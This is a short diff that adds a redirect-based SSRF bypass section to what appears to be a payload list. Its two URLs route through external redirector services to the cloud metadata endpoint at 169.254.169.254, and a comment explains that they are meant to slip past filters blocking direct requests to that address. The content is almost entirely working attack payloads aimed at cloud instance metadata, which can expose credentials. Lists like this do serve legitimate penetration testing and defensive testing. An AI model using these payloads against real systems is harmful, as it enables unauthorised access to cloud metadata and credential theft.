@@ -1,0 +1,5 @@
+# ---- Redirect-Based SSRF Bypass ----
+# If app blocks direct 169.254.x.x but follows redirects:
+# Host https://ssrf.redir.me/169.254.169.254/ which redirects to metadata
+https://ssrf.redir.me/169.254.169.254/latest/meta-data/
+https://r3dir.me/http://169.254.169.254/latest/meta-data/
